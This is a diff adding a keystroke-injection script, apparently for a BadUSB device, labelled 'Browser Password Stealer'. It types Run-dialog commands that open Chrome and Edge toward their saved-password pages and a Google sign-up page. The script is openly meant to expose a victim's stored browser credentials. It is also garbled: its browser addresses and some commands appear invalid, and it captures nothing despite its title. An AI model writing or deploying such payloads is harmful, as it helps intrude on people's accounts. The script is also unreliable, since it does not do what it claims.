@@ -1,0 +1,42 @@
+REM ============================================================
+REM   Browser Password Stealer
+REM   Opens Chrome/Edge and triggers password save dialog capture
+REM ============================================================
+
+DELAY 2000
+
+STRING ============================================
+ENTER
+STRING   BROWSER PASSWORD STEALER
+ENTER
+STRING ============================================
+ENTER
+ENTER
+
+REM Open Chrome with login page (triggers password manager)
+GUI r
+DELAY 500
+STRING chrome.exe about:logins
+ENTER
+DELAY 3000
+
+STRING echo Opening Google Login page...
+ENTER
+STRING start https://accounts.google.com/SignUp
+ENTER
+DELAY 2000
+
+REM Open Edge too (many users have passwords saved there)
+STRING echo Checking Edge passwords...
+ENTER
+STRING edge.exe about:settings/passwords
+ENTER
+DELAY 3000
+
+STRING echo ============================================
+ENTER
+STRING echo Browser password check complete!
+ENTER
+STRING echo Check Chrome at chrome://logins for details
+ENTER
+SLEEP 2000
